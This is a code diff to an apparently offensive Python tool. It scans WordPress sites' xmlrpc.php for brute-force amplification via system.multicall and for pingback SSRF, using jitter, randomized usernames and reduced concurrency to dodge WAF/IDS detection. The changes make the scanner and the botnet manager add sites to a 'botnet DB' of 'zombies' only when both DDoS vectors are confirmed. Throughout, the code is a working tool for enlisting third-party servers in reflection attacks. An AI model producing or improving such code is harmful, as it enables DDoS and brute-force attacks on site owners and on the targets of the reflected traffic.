@@ -4401,10 +4401,14 @@ def _cms_scan_single(url, batch_mode=False):
             return path, desc, 0, 0, ""
 
     # Reduced concurrency to lower WAF/IDS burst signature
-    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as pool:
-        futures = [pool.submit(check_path, p) for p in paths]
-        for future in concurrent.futures.as_completed(futures):
-            path, desc, code, size, preview = future.result()
+    pool = concurrent.futures.ThreadPoolExecutor(max_workers=3)
+    futures = [pool.submit(check_path, p) for p in paths]
+    try:
+        for future in concurrent.futures.as_completed(futures, timeout=90):
+            try:
+                path, desc, code, size, preview = future.result(timeout=15)
+            except (concurrent.futures.TimeoutError, Exception):
+                continue
             if code == 200:
                 risk = ""
                 # Check for sensitive content
@@ -4417,6 +4421,12 @@ def _cms_scan_single(url, batch_mode=False):
                 findings.append((path, desc, "forbidden"))
             elif code in (301, 302):
                 print(f"  {C}{code}{RST}  {path:<40} {desc} (redirect)")
+    except concurrent.futures.TimeoutError:
+        print_warn("Path scan timed out — some paths were not checked")
+        for f in futures:
+            f.cancel()
+    finally:
+        pool.shutdown(wait=False, cancel_futures=True)
 
     # WordPress-specific deep checks
     if cms == "WordPress":
@@ -4459,6 +4469,7 @@ def _cms_scan_single(url, batch_mode=False):
                 findings.append(("/xmlrpc.php", "XML-RPC active", "confirmed"))
 
                 # ── Active verification: system.multicall brute-force amplification ──
+                multicall_vuln = False
                 if "system.multicall" in xmlrpc_methods:
                     _cms_jitter(1.0, 3.0)
                     # Randomize probe usernames to avoid static signature
@@ -4489,6 +4500,7 @@ def _cms_scan_single(url, batch_mode=False):
                         mc_resp = session.post(xmlrpc_url, data=multicall_payload,
                                                headers={"Content-Type": "text/xml"}, timeout=10)
                         if mc_resp.status_code == 200 and "methodResponse" in mc_resp.text:
+                            multicall_vuln = True
                             print(f"    {R}[VULN]{RST} system.multicall accepts batched auth — brute-force amplification CONFIRMED")
                             findings.append(("/xmlrpc.php", "Multicall brute-force", "confirmed"))
                         else:
@@ -4497,6 +4509,7 @@ def _cms_scan_single(url, batch_mode=False):
                         pass
 
                 # ── Active verification: pingback SSRF ──
+                pingback_vuln = False
                 if "pingback.ping" in xmlrpc_methods:
                     _cms_jitter(1.0, 3.0)
                     session.cookies.clear()
@@ -4514,14 +4527,17 @@ def _cms_scan_single(url, batch_mode=False):
                             fault = re.search(r"<int>(\d+)</int>", pb_resp.text)
                             fc = fault.group(1) if fault else "?"
                             if fc == "0":
+                                pingback_vuln = True
                                 print(f"    {R}[VULN]{RST} Pingback SSRF — server accepts arbitrary outbound requests")
                                 findings.append(("/xmlrpc.php", "Pingback SSRF", "confirmed"))
                             elif fc in ("17", "48"):
+                                pingback_vuln = True
                                 print(f"    {Y}[PARTIAL]{RST} Pingback processed (fault {fc}) — outbound request made, SSRF likely")
                                 findings.append(("/xmlrpc.php", "Pingback SSRF partial", "likely"))
                             else:
                                 print(f"    {Y}[INFO]{RST} Pingback returned fault code {fc}")
                         else:
+                            pingback_vuln = True
                             print(f"    {R}[VULN]{RST} Pingback accepted without fault — SSRF confirmed")
                             findings.append(("/xmlrpc.php", "Pingback SSRF", "confirmed"))
                     except Exception:
@@ -4565,15 +4581,13 @@ def _cms_scan_single(url, batch_mode=False):
                 if high:
                     print(f"    {R}[!] HIGH risk methods:{RST} {', '.join(high)}")
 
-                # ── Save to botnet DB only if BOTH amplification vectors found ──
+                # ── Save to botnet DB only if BOTH vectors CONFIRMED vulnerable ──
                 ddos_vecs = []
-                has_pingback = "pingback.ping" in xmlrpc_methods
-                has_multicall = "system.multicall" in xmlrpc_methods
-                if has_pingback:
+                if pingback_vuln:
                     ddos_vecs.append("pingback.ping")
-                if has_multicall:
+                if multicall_vuln:
                     ddos_vecs.append("system.multicall")
-                if has_pingback and has_multicall:
+                if pingback_vuln and multicall_vuln:
                     # Check if already in DB before adding
                     existing = _botnet_db_load()
                     already_exists = any(z["url"] == url for z in existing)
@@ -4594,6 +4608,9 @@ def _cms_scan_single(url, batch_mode=False):
 
         except Exception:
             pass
+
+    # Close session to release connections before returning
+    session.close()
 
     print(f"\n  {Y}{'═' * 50}{RST}")
     print_row("Findings", str(len(findings)))
@@ -4660,7 +4677,11 @@ def cms_vuln_scanner():
                 print(f"  {C}[~]{RST} Already in botnet DB — scanning for updates...")
             print(f"  {M}{'━' * 55}{RST}")
 
-            findings = _cms_scan_single(target_url, batch_mode=True)
+            try:
+                findings = _cms_scan_single(target_url, batch_mode=True)
+            except Exception as e:
+                print_err(f"Scan failed for {target_url}: {e}")
+                findings = []
             n = len(findings) if findings else 0
             total_findings += n
             if n > 0:
@@ -7884,9 +7905,38 @@ def botnet_manager():
             if not new_url.startswith(("http://", "https://")):
                 new_url = "https://" + new_url
             new_url = new_url.rstrip("/")
-            _botnet_db_add(new_url, "Manual", ["pingback.ping"])
-            zombies = _botnet_db_load()
-            print(f"  {G}[+]{RST} Zombie added.")
+            # Verify BOTH vectors before adding to DB
+            xmlrpc_url = new_url.rstrip("/") + "/xmlrpc.php"
+            print(f"  {Y}[~]{RST} Probing {xmlrpc_url} ...")
+            try:
+                sess = requests.Session()
+                sess.headers.update({"User-Agent": random.choice(USER_AGENTS)})
+                sess.verify = False
+                list_resp = sess.post(xmlrpc_url, timeout=10,
+                    data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
+                    headers={"Content-Type": "text/xml"})
+                if list_resp.status_code != 200 or "methodResponse" not in list_resp.text:
+                    print(f"  {R}[!]{RST} XML-RPC not active or unreachable — zombie NOT added.")
+                    continue
+                methods = re.findall(r"<string>(.*?)</string>", list_resp.text)
+                has_pingback = "pingback.ping" in methods
+                has_multicall = "system.multicall" in methods
+                if not has_pingback:
+                    print(f"  {R}[!]{RST} pingback.ping NOT available — zombie NOT added.")
+                if not has_multicall:
+                    print(f"  {R}[!]{RST} system.multicall NOT available — zombie NOT added.")
+                if not (has_pingback and has_multicall):
+                    continue
+                ddos_vecs = []
+                if has_pingback:
+                    ddos_vecs.append("pingback.ping")
+                if has_multicall:
+                    ddos_vecs.append("system.multicall")
+                _botnet_db_add(new_url, "Manual", ddos_vecs)
+                zombies = _botnet_db_load()
+                print(f"  {G}[+]{RST} Both vectors confirmed — zombie added to DB.")
+            except Exception as e:
+                print(f"  {R}[!]{RST} Probe failed: {e} — zombie NOT added.")
         elif choice == "3":
             idx = input(f"  {Y}Zombie number to remove:{RST} ").strip()
             try:
